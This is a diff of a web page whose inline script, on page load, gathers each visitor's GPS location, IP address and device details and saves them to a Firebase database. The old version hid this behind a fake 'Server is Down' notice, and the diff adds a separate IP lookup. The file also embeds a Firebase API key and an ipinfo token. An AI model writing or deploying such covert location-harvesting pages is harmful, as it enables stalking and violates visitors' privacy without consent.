@@ -5,11 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Home Page</title>
     <script type="module">
-        // Import Firebase v9+ (Modular)
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
             authDomain: "locationsaver-b9997.firebaseapp.com",
@@ -19,9 +17,20 @@
             appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
             measurementId: "G-WJJY3Q2M8E"
         };
-        
+
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch("https://api64.ipify.org?format=json");
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("Error fetching IP address:", error);
+                return "Unknown";
+            }
+        }
 
         function getDeviceInfo() {
             return {
@@ -43,20 +52,26 @@
 
         function getGPSLocation(callback) {
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(position => {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const ipAddress = await getIPAddress();
                     callback({
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
                         accuracy: position.coords.accuracy,
+                        ipAddress: ipAddress,
                         type: "GPS"
                     });
-                }, error => {
-                    console.warn("❌ GPS denied, using IP location instead.");
-                    callback(null);
-                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+                }, (error) => {
+                    console.warn("GPS denied, using IP location instead.");
+                    getIPLocation(callback);
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
             } else {
-                console.warn("❌ GPS not supported.");
-                callback(null);
+                console.warn("GPS not supported.");
+                getIPLocation(callback);
             }
         }
 
@@ -64,43 +79,39 @@
             fetch("https://ipinfo.io/json?token=6a9008bb55fd89")
                 .then(response => response.json())
                 .then(data => {
-                    const locationData = {
+                    callback({
                         ip: data.ip,
                         city: data.city,
                         region: data.region,
                         country: data.country,
-                        location: data.loc.split(","),
+                        latitude: data.loc.split(",")[0],
+                        longitude: data.loc.split(",")[1],
                         org: data.org,
                         postal: data.postal || "Unknown",
                         timezone: data.timezone || "Unknown",
                         type: "IP"
-                    };
-                    callback(locationData);
+                    });
                 })
                 .catch(error => {
-                    console.error("❌ Error fetching IP location:", error);
+                    console.error("Error fetching IP location:", error);
                     callback(null);
                 });
         }
 
-        function saveUserData(locationData) {
+        getGPSLocation(async (locationData) => {
+            const deviceInfo = getDeviceInfo();
+            const timestamp = new Date();
             const userData = {
                 location: locationData || "Unknown",
-                device: getDeviceInfo(),
-                timestamp: new Date(),
-                ip: locationData?.ip || "Unknown"
+                device: deviceInfo,
+                timestamp: timestamp
             };
             
-            addDoc(collection(db, "user_data"), userData)
-                .then(() => console.log("✅ User data saved:", userData))
-                .catch(error => console.error("❌ Error saving user data:", error));
-        }
-
-        getGPSLocation(gpsData => {
-            if (gpsData) {
-                saveUserData(gpsData);
-            } else {
-                getIPLocation(ipData => saveUserData(ipData));
+            try {
+                await addDoc(collection(db, "user_data"), userData);
+                console.log("✅ User data saved:", userData);
+            } catch (error) {
+                console.error("❌ Error saving user data:", error);
             }
         });
     </script>
@@ -127,7 +138,7 @@
         }
         .icon {
             font-size: 80px;
-            color: #dc3545;
+            color: #28a745;
             animation: blink 1.5s infinite;
         }
         @keyframes blink {
@@ -152,10 +163,11 @@
 
 <body>
     <div class="container">
-        <div class="icon">⚠️</div>
-        <h1>Server is Down</h1>
-        <p>We are currently experiencing technical difficulties. Please try again later.</p>
-        <button onclick="location.reload()">Try Again</button>
+        <div class="icon">📍</div>
+        <h1>Tracking Your Location</h1>
+        <p>Your location data is being recorded securely.</p>
+        <button onclick="location.reload()">Refresh</button>
     </div>
 </body>
+
 </html>
